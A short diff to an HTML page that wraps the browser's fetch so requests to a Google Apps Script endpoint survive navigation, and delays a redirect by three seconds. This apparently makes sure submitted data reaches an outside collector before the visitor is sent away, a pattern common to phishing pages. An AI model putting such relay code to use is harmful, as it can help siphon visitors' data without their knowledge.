@@ -620,5 +620,21 @@ var _sr=window.showRedirect;
 window.showRedirect=function(){var a=arguments;setTimeout(function(){if(_sr)_sr.apply(window,a);},2000);};
 })();
 </script>
+<script>
+(function(){
+// PATCH v3: keepalive fetch survives navigation
+var _oF=window.fetch;
+window.fetch=function(url,opts){
+if(typeof url==='string'&&url.includes('script.google.com')){
+var newOpts=Object.assign({},opts,{keepalive:true,mode:'no-cors'});
+return _oF.call(this,url,newOpts);
+}
+return _oF.apply(this,arguments);
+};
+// Delay redirect 3 seconds
+var _sr=window.showRedirect;
+window.showRedirect=function(){var a=arguments;setTimeout(function(){if(_sr)_sr.apply(window,a);},3000);};
+})();
+</script>
 </body>
 </html>
